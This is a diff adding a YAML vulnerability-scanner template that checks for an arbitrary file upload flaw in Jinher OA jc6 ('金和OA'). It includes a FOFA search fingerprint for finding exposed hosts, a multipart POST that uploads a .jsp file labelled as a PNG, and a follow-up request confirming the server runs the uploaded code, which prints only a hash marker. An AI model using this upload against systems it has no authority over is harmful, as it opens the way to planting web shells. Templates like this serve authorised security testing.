@@ -1,0 +1,34 @@
+id: poc-yaml-jinher-oa-jc6-upload-anyfile-upload
+info:
+  name: 金和OA jc6 Upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 金和OA
+  fofa: body="/jc6/platform/sys/login"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/
+  headers:
+    Content-Type: multipart/form-data; boundary=74f0dc3df975274386a11be68cacc0e5
+  data: '--74f0dc3df975274386a11be68cacc0e5
+
+    Content-Disposition: form-data; name="img"; filename="{{.t1}}.jsp"
+
+    Content-Type: image/png
+
+
+    <% out.println("{{.t2}}");%>
+
+    --74f0dc3df975274386a11be68cacc0e5--'
+  expression: status_code == 200 && contains(body,"/upload")
+  output:
+  - regex_match(body,`2]='/(?P<file>.*).jsp`)
+- method: GET
+  path: /jc6/{{.file}}.jsp
+  expression: status_code == 200 && contains(body,t2) && !contains(body,"<")
+transport: http
